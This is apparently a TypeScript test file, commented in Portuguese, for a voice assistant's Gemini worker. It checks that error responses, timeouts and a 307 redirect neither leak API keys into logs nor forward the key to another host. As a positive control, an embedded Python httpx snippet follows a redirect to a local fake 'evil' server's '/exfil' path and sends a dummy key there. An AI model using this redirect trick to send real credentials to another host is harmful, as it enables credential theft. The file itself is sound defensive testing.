import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { GENERATION_FAILURE_TEXT } from '../../shared/voiceProtocol.js';
import { HAVE_VENV, REAL_LOOKING_KEY, VENV_PY, FakeGemini, startEgressHarness } from './helpers/egress.js';

/**
 * Fase 12 §2.6 e §2.5: caminhos de ERRO do Gemini (4xx/5xx, travamento, redirecionamento) — nenhuma chave nem
 * conteúdo sensível pode aparecer nos logs, e um 307 não pode levar a chave a outro host.
 */
const skip = !HAVE_VENV && 'venv do worker (.runtime/.venv) ausente';
const ECHO = 'AIzaSyD-ECO-NO-ERRO-0123456789 e ?key=AIzaSyD-OUTRA-CHAVE-ECO-999';
const SENSITIVE = ['ECO-NO-ERRO', 'OUTRA-CHAVE-ECO', 'CHAVE-REAL', REAL_LOOKING_KEY, 'MARCADOR-FALA-ERRO'];

function assertNoLeak(logs: string[], extra: string[] = []): void {
  const all = logs.join('\n');
  for (const s of [...SENSITIVE, ...extra]) assert.ok(!all.includes(s), `vazou "${s}" nos logs:\n${all.slice(0, 1500)}`);
}

describe('caminhos de erro do Gemini — nada vaza e a chave não viaja (Fase 12)', { skip }, () => {
  for (const status of [400, 401, 429, 500, 503]) {
    it(`HTTP ${status} que ECOA uma chave na mensagem: o turno falha com honestidade, a chave sai mascarada dos logs`, async () => {
      const h = await startEgressHarness();
      try {
        h.gemini.mode = { kind: 'status', status, echo: ECHO };
        const s = await h.newSession();
        const r = await h.say(s, 'conta uma curiosidade MARCADOR-FALA-ERRO');
        s.close();
        assert.ok(r.spoken.includes(GENERATION_FAILURE_TEXT), `fala de falha esperada: ${JSON.stringify(r.spoken)}`);
        assert.ok(h.gemini.requests.length >= 1, 'a requisição chegou ao falso');
        assert.equal(h.gemini.requests[0].headers['x-goog-api-key'], 'test-dummy-key');
        assertNoLeak(h.logs);
        const all = h.logs.join('\n');
        assert.ok(all.includes('Erro na geração via Gemini'), `o captador de logs funciona:\n${all.slice(0, 800)}`);
        assert.ok(all.includes('[REDACTED]'), `a máscara foi ACIONADA no eco da chave (controle positivo):\n${all.slice(0, 800)}`);
      } finally {
        await h.stop();
      }
    });
  }

  it('travamento (servidor nunca responde): estoura o timeout curto de teste, falha com honestidade, sem vazar', async () => {
    const h = await startEgressHarness({ workerEnv: { RODRIGO_TEST_GEMINI_TIMEOUT_MS: '1500' } });
    try {
      h.gemini.mode = { kind: 'hang' };
      const s = await h.newSession();
      const t0 = Date.now();
      const r = await h.say(s, 'conta uma curiosidade MARCADOR-FALA-ERRO');
      s.close();
      assert.ok(Date.now() - t0 < 12000, `demorou ${Date.now() - t0} ms`);
      assert.ok(r.spoken.includes(GENERATION_FAILURE_TEXT), JSON.stringify(r.spoken));
      assertNoLeak(h.logs);
      assert.ok(h.logs.join('\n').includes('Erro na geração via Gemini'));
    } finally {
      await h.stop();
    }
  });
});

describe('redirecionamento 307 para outro host — a chave não pode seguir (Fase 12, §2.5 regra 4)', { skip }, () => {
  it('CONTROLE POSITIVO: um cliente httpx COM follow_redirects entregaria a chave ao host de destino (o falso e o gravador funcionam)', async () => {
    const evil = new FakeGemini();
    await evil.start();
    const redir = new FakeGemini();
    await redir.start();
    try {
      redir.mode = { kind: 'redirect', to: `${evil.url}/exfil` };
      const py = `
import httpx, sys
c = httpx.Client(follow_redirects=True)
c.post(sys.argv[1] + "/v1beta/models/x:generateContent", headers={"x-goog-api-key": "CHAVE-CONTROLE-SEGREDO"}, content=b"{}")
`;
      // spawn ASSÍNCRONO: os servidores falsos vivem neste mesmo processo e precisam do event loop livre para responder
      const r = await new Promise<{ status: number | null; stderr: string }>((resolve) => {
        const child = spawn(VENV_PY, ['-c', py, redir.url], { stdio: ['ignore', 'ignore', 'pipe'] });
        let stderr = '';
        child.stderr.on('data', (d: Buffer) => { stderr += d.toString(); });
        child.on('close', (status) => resolve({ status, stderr }));
      });
      assert.equal(r.status, 0, r.stderr);
      assert.equal(evil.requests.length, 1, 'com follow_redirects o destino RECEBE a requisição');
      assert.equal(evil.requests[0].headers['x-goog-api-key'], 'CHAVE-CONTROLE-SEGREDO', 'e com a chave no cabeçalho');
    } finally {
      await evil.stop();
      await redir.stop();
    }
  });

  it('o worker real (geração E intenção) recebe o 307 e NÃO segue: o host de destino recebe ZERO requisições', async () => {
    const evil = new FakeGemini();
    await evil.start();
    const h = await startEgressHarness({ systemTools: true });
    try {
      h.gemini.mode = { kind: 'redirect', to: `${evil.url}/exfil` };
      const s = await h.newSession();
      const gen = await h.say(s, 'conta uma curiosidade MARCADOR-FALA-ERRO');
      const intent = await h.say(s, 'que horas são agora MARCADOR-FALA-ERRO-2');
      s.close();
      assert.ok(gen.spoken.includes(GENERATION_FAILURE_TEXT), JSON.stringify(gen.spoken));
      assert.ok(intent.turnId.length > 0);
      assert.ok(h.gemini.streamRequests().length >= 1, 'a geração tentou o endpoint');
      assert.ok(h.gemini.intentRequests().length >= 1, 'a intenção tentou o endpoint');
      assert.equal(evil.requests.length, 0, `o destino do redirecionamento recebeu ${evil.requests.length} requisição(ões): ${JSON.stringify(evil.requests.map((r) => r.headers['x-goog-api-key']))}`);
      assertNoLeak(h.logs);
    } finally {
      await h.stop();
      await evil.stop();
    }
  });
});
